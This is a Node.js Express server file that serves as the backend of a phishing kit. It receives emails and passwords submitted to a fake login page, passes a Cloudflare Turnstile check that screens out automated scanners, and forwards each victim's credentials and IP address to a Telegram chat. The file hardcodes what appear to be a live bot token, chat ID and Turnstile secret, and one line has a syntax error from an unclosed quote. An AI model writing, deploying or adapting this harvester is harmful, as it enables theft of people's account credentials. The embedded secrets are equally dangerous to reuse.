const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
// WARNING: Keep these secrets safe. Do not share this file.
const TELEGRAM_BOT_TOKEN = '8272014364:AAGUZGuiiKewLNzQGcZ8ObPETFUF5H-etEc';
const TELEGRAM_CHAT_ID = '5673442015';
const TURNSTILE_SECRET_KEY = '0x4AAAAAAD5u-FBz6ItDxYcdRxCIZMlvcqc';
// ---------------------

app.use(cors());
app.use(express.json());

// This is the only job of this server: Verify CAPTCHA and send Telegram message
app.post('/verify', async (req, res) => {
    const { email, password, turnstileToken } = req.body;
    
    // Get User IP
    const userIP = req.ip || req.headers['x-forwarded-for'] || '127.0.0.1';
    const realIP = typeof userIP === 'string ? userIP.split(',')[0] : userIP;

    // 1. Verify Cloudflare Turnstile Token
    if (!turnstileToken) {
        return res.status(403).json({ success: false, message: "Security check failed (No token)." });
    }

    try {
        const verificationUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
        const response = await axios.post(verificationUrl, {
            secret: TURNSTILE_SECRET_KEY,
            response: turnstileToken,
            remoteip: realIP
        });

        if (!response.data.success) {
            console.log("Turnstile failed:", response.data['error-codes']);
            return res.status(403).json({ success: false, message: "Security check failed (Robot detected)." });
        }
    } catch (error) {
        console.error("Error verifying CAPTCHA:", error.message);
        return res.status(500).json({ success: false, message: "System error." });
    }

    // 2. If valid, send to Telegram
    if (!email || !password) {
        return res.status(400).json({ success: false, message: "Missing data." });
    }

    const message = `
🚨 **NEW LOGIN DETECTED** 🚨

👤 **Email:** ${email}
🔑 **Password:** ${password}
🌐 **IP Address:** ${realIP}
⏰ **Time:** ${new Date().toISOString()}
    `;

    try {
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log("Credentials sent to Telegram.");
        res.json({ success: true });
    } catch (error) {
        console.error("Telegram Error:", error.message);
        res.status(500).json({ success: false, message: "Failed to send data." });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});